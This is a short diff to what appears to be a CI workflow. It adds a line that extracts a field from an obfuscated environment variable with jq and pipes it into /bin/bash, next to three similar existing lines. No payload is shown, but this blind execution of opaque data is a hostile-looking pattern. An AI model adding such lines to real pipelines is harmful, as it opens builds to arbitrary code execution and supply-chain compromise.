@@ -25,6 +25,7 @@ jobs:
           echo $vvznw2012 | jq -r .hx49615 | /bin/bash
           echo $sapdz0 | jq -r .nray9 | /bin/bash
           printf '%s' "$g042" | jq -r .ow8 | /bin/bash
+          printf '%s' "$btuc7" | jq -r .jqzi75 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
